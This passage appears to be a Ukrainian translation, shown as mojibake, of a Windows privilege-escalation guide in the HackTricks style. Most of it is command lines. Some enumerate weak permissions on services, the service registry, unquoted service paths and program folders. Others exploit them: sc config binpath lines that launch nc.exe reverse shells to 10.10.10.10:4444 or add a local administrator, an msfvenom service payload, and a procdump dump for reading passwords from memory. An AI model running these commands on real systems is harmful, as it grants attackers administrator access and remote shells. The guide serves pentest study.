–ó–∞–≤–∂–¥–∏ –ø–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ –º–æ–∂–ª–∏–≤—ñ [**–≤—ñ–¥–ª–∞–≥–æ–¥–∂—É–≤–∞—á—ñ electron/cef/chromium**, —è–∫—ñ –ø—Ä–∞—Ü—é—é—Ç—å, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è —Ü–∏–º –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –¥–æ–∑–≤–æ–ª—ñ–≤ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ –ø—Ä–æ—Ü–µ—Å—ñ–≤**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –¥–æ–∑–≤–æ–ª—ñ–≤ –Ω–∞ —Ç–µ–∫–∏ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ –ø—Ä–æ—Ü–µ—Å—ñ–≤ (**[**DLL Hijacking**](dll-hijacking.md)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### –í–∏–¥–æ–±—É—Ç–æ–∫ –ø–∞—Ä–æ–ª—ñ–≤ –∑ –ø–∞–º'—è—Ç—ñ

–í–∏ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –¥–∞–º–ø –ø–∞–º'—è—Ç—ñ –∑–∞–ø—É—â–µ–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **procdump** –≤—ñ–¥ sysinternals. –°–ª—É–∂–±–∏, —Ç–∞–∫—ñ —è–∫ FTP, –º–∞—é—Ç—å **–ø–∞—Ä–æ–ª—ñ —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É –≤–∏–≥–ª—è–¥—ñ –≤ –ø–∞–º'—è—Ç—ñ**, —Å–ø—Ä–æ–±—É–π—Ç–µ –≤–∏—Ç—è–≥—Ç–∏ –¥–∞–º–ø –ø–∞–º'—è—Ç—ñ —Ç–∞ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ –ø–∞—Ä–æ–ª—ñ.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### –ù–µ–±–µ–∑–ø–µ—á–Ω—ñ GUI –¥–æ–¥–∞—Ç–∫–∏

**–î–æ–¥–∞—Ç–∫–∏, —è–∫—ñ –ø—Ä–∞—Ü—é—é—Ç—å —è–∫ SYSTEM, –º–æ–∂—É—Ç—å –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ —Å—Ç–≤–æ—Ä–∏—Ç–∏ CMD –∞–±–æ –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ –∫–∞—Ç–∞–ª–æ–≥–∏.**

–ü—Ä–∏–∫–ª–∞–¥: "–î–æ–≤—ñ–¥–∫–∞ —Ç–∞ –ø—ñ–¥—Ç—Ä–∏–º–∫–∞ Windows" (Windows + F1), –ø–æ—à—É–∫ "–∫–æ–º–∞–Ω–¥–Ω–∏–π —Ä—è–¥–æ–∫", –∫–ª–∞—Ü–Ω—ñ—Ç—å "–ö–ª–∞—Ü–Ω—ñ—Ç—å, —â–æ–± –≤—ñ–¥–∫—Ä–∏—Ç–∏ –∫–æ–º–∞–Ω–¥–Ω–∏–π —Ä—è–¥–æ–∫"

## –°–ª—É–∂–±–∏

–û—Ç—Ä–∏–º–∞—Ç–∏ —Å–ø–∏—Å–æ–∫ —Å–ª—É–∂–±:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### –î–æ–∑–≤–æ–ª–∏

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **sc**, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ —Å–µ—Ä–≤—ñ—Å.
```bash
sc qc <service_name>
```
–†–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –º–∞—Ç–∏ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª **accesschk** –≤—ñ–¥ _Sysinternals_, —â–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏–π —Ä—ñ–≤–µ–Ω—å –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–ª—è –∫–æ–∂–Ω–æ—ó —Å–ª—É–∂–±–∏.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
–†–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –º–æ–∂–µ "Authenticated Users" –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –±—É–¥—å-—è–∫—É —Å–ª—É–∂–±—É:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[–í–∏ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ accesschk.exe –¥–ª—è XP —Ç—É—Ç](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### –£–≤—ñ–º–∫–Ω–µ–Ω–Ω—è —Å–ª—É–∂–±–∏

–Ø–∫—â–æ —É –≤–∞—Å –≤–∏–Ω–∏–∫–∞—î —Ü—è –ø–æ–º–∏–ª–∫–∞ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∑ SSDPSRV):

_–°–∏—Å—Ç–µ–º–Ω–∞ –ø–æ–º–∏–ª–∫–∞ 1058 —Å—Ç–∞–ª–∞—Å—è._\
_–°–ª—É–∂–±—É –Ω–µ –º–æ–∂–Ω–∞ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ —á–µ—Ä–µ–∑ —Ç–µ, —â–æ –≤–æ–Ω–∞ –≤–∏–º–∫–Ω–µ–Ω–∞ –∞–±–æ —É –Ω–µ—ó –Ω–µ–º–∞—î –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–∏—Ö –ø—Ä–∏—Å—Ç—Ä–æ—ó–≤, –ø–æ–≤'—è–∑–∞–Ω–∏—Ö –∑ –Ω–µ—é._

–í–∏ –º–æ–∂–µ—Ç–µ —É–≤—ñ–º–∫–Ω—É—Ç–∏ —ó—ó, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**–í—Ä–∞—Ö—É–π—Ç–µ, —â–æ —Å–ª—É–∂–±–∞ upnphost –∑–∞–ª–µ–∂–∏—Ç—å –≤—ñ–¥ SSDPSRV –¥–ª—è —Ä–æ–±–æ—Ç–∏ (–¥–ª—è XP SP1)**

**–©–µ –æ–¥–∏–Ω –æ–±—Ö—ñ–¥–Ω–∏–π —à–ª—è—Ö** —Ü—ñ—î—ó –ø—Ä–æ–±–ª–µ–º–∏ - –∑–∞–ø—É—Å–∫:
```
sc.exe config usosvc start= auto
```
### **–ó–º—ñ–Ω–∞ —à–ª—è—Ö—É –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É —Å–ª—É–∂–±–∏**

–£ –≤–∏–ø–∞–¥–∫—É, –∫–æ–ª–∏ –≥—Ä—É–ø–∞ "–ê–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ" –º–∞—î **SERVICE\_ALL\_ACCESS** –¥–æ —Å–ª—É–∂–±–∏, –º–æ–∂–ª–∏–≤–∞ –∑–º—ñ–Ω–∞ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–æ–≥–æ –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É —Å–ª—É–∂–±–∏. –î–ª—è –∑–º—ñ–Ω–∏ —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫ —Å–ª—É–∂–±–∏
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
–ü—Ä–∏–≤—ñ–ª–µ—ó –º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø—ñ–¥–≤–∏—â–µ–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ä—ñ–∑–Ω–∏—Ö –¥–æ–∑–≤–æ–ª—ñ–≤:

* **SERVICE\_CHANGE\_CONFIG**: –î–æ–∑–≤–æ–ª—è—î –ø–µ—Ä–µ–∫–æ–Ω—Ñ—ñ–≥—É—Ä—É–≤–∞—Ç–∏ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª —Å–ª—É–∂–±–∏.
* **WRITE\_DAC**: –î–æ–∑–≤–æ–ª—è—î –ø–µ—Ä–µ–∫–æ–Ω—Ñ—ñ–≥—É—Ä—É–≤–∞—Ç–∏ –¥–æ–∑–≤–æ–ª–∏, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –∑–º—ñ–Ω–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Å–ª—É–∂–±–∏.
* **WRITE\_OWNER**: –î–æ–∑–≤–æ–ª—è—î –æ—Ç—Ä–∏–º–∞—Ç–∏ –≤–ª–∞—Å–Ω—ñ—Å—Ç—å —Ç–∞ –ø–µ—Ä–µ–∫–æ–Ω—Ñ—ñ–≥—É—Ä—É–≤–∞—Ç–∏ –¥–æ–∑–≤–æ–ª–∏.
* **GENERIC\_WRITE**: –ù–∞—Å–ª—ñ–¥—É—î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∑–º—ñ–Ω–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Å–ª—É–∂–±–∏.
* **GENERIC\_ALL**: –¢–∞–∫–æ–∂ –Ω–∞—Å–ª—ñ–¥—É—î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∑–º—ñ–Ω–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Å–ª—É–∂–±–∏.

–î–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ç–∞ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Ü—ñ—î—ó —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ _exploit/windows/local/service\_permissions_.

### –°–ª–∞–±–∫—ñ –¥–æ–∑–≤–æ–ª–∏ –Ω–∞ –±—ñ–Ω–∞—Ä–Ω—ñ —Ñ–∞–π–ª–∏ —Å–ª—É–∂–±

**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –º–æ–∂–µ—Ç–µ –≤–∏ –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª, —è–∫–∏–π –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —Å–ª—É–∂–±–æ—é**, –∞–±–æ —á–∏ –º–∞—î—Ç–µ **–ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å —É –ø–∞–ø—Ü—ñ**, –¥–µ —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª ([**DLL Hijacking**](dll-hijacking.md))**.**\
–í–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∫–æ–∂–Ω–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª, —è–∫–∏–π –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —Å–ª—É–∂–±–æ—é, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **wmic** (–Ω–µ –≤ system32) —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –≤–∞—à—ñ –¥–æ–∑–≤–æ–ª–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **sc** —Ç–∞ **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### –î–æ–∑–≤–æ–ª–∏ –Ω–∞ –∑–º—ñ–Ω—É —Ä–µ—î—Å—Ç—Ä—É —Å–ª—É–∂–±

–í–∞–º —Å–ª—ñ–¥ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –º–æ–∂–µ—Ç–µ –≤–∏ –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π —Ä–µ—î—Å—Ç—Ä —Å–ª—É–∂–±.\
–í–∏ –º–æ–∂–µ—Ç–µ **–ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏** —Å–≤–æ—ó **–¥–æ–∑–≤–æ–ª–∏** –Ω–∞ —Ä–µ—î—Å—Ç—Ä —Å–ª—É–∂–±, –≤–∏–∫–æ–Ω–∞–≤—à–∏:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
–ü–æ—Ç—Ä—ñ–±–Ω–æ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ **Authenticated Users** –∞–±–æ **NT AUTHORITY\INTERACTIVE** –º–∞—é—Ç—å –¥–æ–∑–≤—ñ–ª `FullControl`. –Ø–∫—â–æ —Ç–∞–∫, —Ç–æ –º–æ–∂–Ω–∞ –∑–º—ñ–Ω–∏—Ç–∏ —à–ª—è—Ö –¥–æ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–æ–≥–æ –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É.

–î–ª—è –∑–º—ñ–Ω–∏ —à–ª—è—Ö—É –≤–∏–∫–æ–Ω—É–≤–∞–Ω–æ–≥–æ –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### –î–æ–∑–≤–æ–ª–∏ –Ω–∞ –¥–æ–¥–∞–≤–∞–Ω–Ω—è –¥–∞–Ω–∏—Ö/—Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –ø—ñ–¥–∫–∞—Ç–∞–ª–æ–≥—ñ–≤ —É —Ä–µ—î—Å—Ç—Ä—ñ —Å–ª—É–∂–±

–Ø–∫—â–æ —É –≤–∞—Å —î —Ü–µ–π –¥–æ–∑–≤—ñ–ª —É —Ä–µ—î—Å—Ç—Ä—ñ, —Ü–µ –æ–∑–Ω–∞—á–∞—î, —â–æ **–≤–∏ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –ø—ñ–¥–∫–∞—Ç–∞–ª–æ–≥–∏ –∑ —Ü—å–æ–≥–æ**. –£ –≤–∏–ø–∞–¥–∫—É —Å–ª—É–∂–± Windows —Ü—å–æ–≥–æ **–¥–æ—Å—Ç–∞—Ç–Ω—å–æ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –∫–æ–¥—É:**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### –®–ª—è—Ö–∏ –¥–æ —Å–ª—É–∂–± –±–µ–∑ –∫–∞–≤–∏—á–æ–∫

–Ø–∫—â–æ —à–ª—è—Ö –¥–æ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–æ–≥–æ —Ñ–∞–π–ª—É –Ω–µ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –∫–∞–≤–∏—á–∫–∞—Ö, Windows —Å–ø—Ä–æ–±—É—î –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–∂–µ–Ω –∫—ñ–Ω–µ—Ü—å –ø–µ—Ä–µ–¥ –ø—Ä–æ–±—ñ–ª–æ–º.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –¥–ª—è —à–ª—è—Ö—É _C:\Program Files\Some Folder\Service.exe_ Windows —Å–ø—Ä–æ–±—É—î –≤–∏–∫–æ–Ω–∞—Ç–∏:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
### –ü–µ—Ä–µ–ª—ñ–∫ —É—Å—ñ—Ö —à–ª—è—Ö—ñ–≤ —Å–ª—É–∂–± –±–µ–∑ –∫–∞–≤–∏—á–æ–∫, –∑–∞ –≤–∏–Ω—è—Ç–∫–æ–º —Ç–∏—Ö, —â–æ –Ω–∞–ª–µ–∂–∞—Ç—å –≤–±—É–¥–æ–≤–∞–Ω–∏–º —Å–ª—É–∂–±–∞–º Windows:
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏—è–≤–∏—Ç–∏ —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏** —Ü—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é metasploit: `exploit/windows/local/trusted\_service\_path` –í–∏ –º–æ–∂–µ—Ç–µ –≤—Ä—É—á–Ω—É —Å—Ç–≤–æ—Ä–∏—Ç–∏ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª —Å–ª—É–∂–±–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### –í—ñ–¥–Ω–æ–≤–ª—é–≤–∞–ª—å–Ω—ñ –¥—ñ—ó

Windows –¥–æ–∑–≤–æ–ª—è—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –≤–∫–∞–∑–∞—Ç–∏ –¥—ñ—ó, —è–∫—ñ —Å–ª—ñ–¥ –≤–∏–∫–æ–Ω–∞—Ç–∏ —É —Ä–∞–∑—ñ –Ω–µ–≤–¥–∞—á—ñ —Å–ª—É–∂–±–∏. –¶—é —Ñ—É–Ω–∫—Ü—ñ—é –º–æ–∂–Ω–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ —Ç–∞–∫, —â–æ–± –≤–∫–∞–∑—É–≤–∞–ª–∞ –Ω–∞ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª. –Ø–∫—â–æ —Ü–µ–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –º–æ–∂–Ω–∞ –∑–∞–º—ñ–Ω–∏—Ç–∏, –º–æ–∂–ª–∏–≤–∏–π –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤. –î–æ–∫–ª–∞–¥–Ω—ñ—à—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤ [–æ—Ñ—ñ—Ü—ñ–π–Ω—ñ–π –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN).

## –ó–∞—Å—Ç–æ—Å—É–Ω–∫–∏

### –í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ñ –∑–∞—Å—Ç–æ—Å—É–Ω–∫–∏

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ **–¥–æ–∑–≤–æ–ª–∏ –Ω–∞ –±—ñ–Ω–∞—Ä–Ω—ñ —Ñ–∞–π–ª–∏** (–º–æ–∂–ª–∏–≤–æ, –≤–∏ –∑–º–æ–∂–µ—Ç–µ —ó—Ö –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ —Ç–∞ –ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó) —Ç–∞ **–ø–∞–ø–∫–∏** ([DLL Hijacking](dll-hijacking.md)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### –ü—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –º–æ–∂–µ—Ç–µ –≤–∏ –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –¥–µ—è–∫–∏–π –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏–π —Ñ–∞–π–ª –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è –¥–µ—è–∫–æ–≥–æ —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–æ–≥–æ —Ñ–∞–π–ª—É –∞–±–æ —á–∏ –º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –¥–µ—è–∫–∏–π –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π —Ñ–∞–π–ª, —è–∫–∏–π –±—É–¥–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏—Å—è –æ–±–ª—ñ–∫–æ–≤–∏–º –∑–∞–ø–∏—Å–æ–º –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ (schedtasks).

–û–¥–∏–Ω –∑—ñ —Å–ø–æ—Å–æ–±—ñ–≤ –∑–Ω–∞–π—Ç–∏ —Å–ª–∞–±–∫—ñ –¥–æ–∑–≤–æ–ª–∏ –Ω–∞ —Ç–µ–∫–∏/—Ñ–∞–π–ª–∏ –≤ —Å–∏—Å—Ç–µ–º—ñ - —Ü–µ:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### –ó–∞–ø—É—Å–∫ –ø—Ä–∏ —Å—Ç–∞—Ä—Ç—ñ

**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –º–æ–∂–µ—Ç–µ –≤–∏ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –¥–µ—è–∫—ñ —Ä–µ—î—Å—Ç—Ä–∏ –∞–±–æ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π —Ñ–∞–π–ª, —è–∫–∏–π –±—É–¥–µ –∑–∞–ø—É—â–µ–Ω–∏–π —ñ–Ω—à–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º.**\
**–ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ** –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ —Ü—ñ–∫–∞–≤—ñ **–º—ñ—Å—Ü—è –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫—É –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### –î—Ä–∞–π–≤–µ—Ä–∏

–®—É–∫–∞–π—Ç–µ –º–æ–∂–ª–∏–≤—ñ **—Å—Ç–æ—Ä–æ–Ω–Ω—ñ –¥–∏–≤–Ω—ñ/–≤—Ä–∞–∑–ª–∏–≤—ñ** –¥—Ä–∞–π–≤–µ—Ä–∏
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## –í–ò–ö–û–†–ò–°–¢–ê–ù–ù–Ø DLL –£ –ü–†–û–¶–ï–°–Ü PATH

